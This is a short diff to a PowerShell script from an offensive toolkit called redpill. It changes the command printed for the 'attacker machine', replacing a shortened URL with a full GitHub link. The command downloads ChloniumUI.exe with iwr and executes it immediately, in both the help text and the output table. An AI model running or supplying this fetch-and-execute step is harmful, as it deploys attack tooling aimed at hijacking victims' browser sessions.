@@ -70,7 +70,8 @@
 
    Execute in attacker machine
    ---------------------------
-   iwr -Uri shorturl.at/jryEQ -OutFile ChloniumUI.exe;.\ChloniumUI.exe
+   $MyLink = "https://raw.githubusercontent.com/ajpc500/chlonium/master/binaries/ChloniumUI/ChloniumUI.exe"
+   iwr -Uri "$MyLink" -OutFile ChloniumUI.exe;.\ChloniumUI.exe
 
 .LINK
    https://github.com/r00t-3xp10it/redpill
@@ -484,7 +485,8 @@ Start-Sleep -Seconds 1
 ## Output Table { ChloniumUI.exe }
 Write-Host "`nExecute on attacker machine" -ForegroundColor Yellow
 Write-Host "---------------------------"
-Write-Host "iwr -Uri shorturl.at/jryEQ -OutFile ChloniumUI.exe;.\ChloniumUI.exe`n"
+Write-Host "`$MyLink = `"https://raw.githubusercontent.com/ajpc500/chlonium/master/binaries/ChloniumUI/ChloniumUI.exe`""
+Write-Host "iwr -Uri `"`$MyLink`" -OutFile ChloniumUI.exe;.\ChloniumUI.exe`n"
 
 
 <#
